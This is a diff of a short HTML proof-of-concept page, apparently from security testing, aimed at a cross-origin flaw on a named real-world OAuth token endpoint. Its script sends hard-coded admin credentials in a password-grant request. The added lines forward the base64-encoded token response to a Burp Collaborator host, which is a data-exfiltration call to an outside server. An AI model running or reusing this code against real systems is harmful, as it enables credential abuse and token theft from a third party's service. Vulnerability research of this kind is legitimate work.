@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>CORS Test</h1>
+    <h1>CORS PoC</h1>
     <script>
       fetch("https://auth.xchat.xfinity.com/oauth-server/oauth/token", {
         method: "POST",
@@ -12,8 +12,11 @@
         body: "client_id=SupervisorApplication&grant_type=password&username=admin&password=admin12345"
       })
       .then(res => res.text())
-      .then(data => alert("CORS Response: " + data))
-      .catch(err => alert("Request Failed: " + err));
+      .then(data => {
+        // Replace this with your Burp Collaborator URL if testing exfiltration
+        fetch("https://iqcjdn37bkjxk122wxtumoq2dtjk7hv6.oastify.com/log?leak=" + btoa(data));
+        console.log("Response:", data);
+      });
     </script>
   </body>
 </html>
